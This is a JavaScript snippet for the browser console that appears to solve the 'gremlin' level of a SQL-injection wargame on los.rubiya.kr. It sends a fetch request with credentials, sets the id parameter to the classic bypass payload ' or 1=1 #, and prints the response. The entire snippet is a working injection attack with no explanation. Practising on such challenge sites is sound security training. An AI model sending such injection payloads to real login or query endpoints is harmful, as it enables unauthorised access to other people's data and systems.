// On the chrome console window
fetch('https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php?id=\' or 1=1 %23',{
        include: 'credentials'
    }
).then((x) => x.text()).then((x) => console.log(x));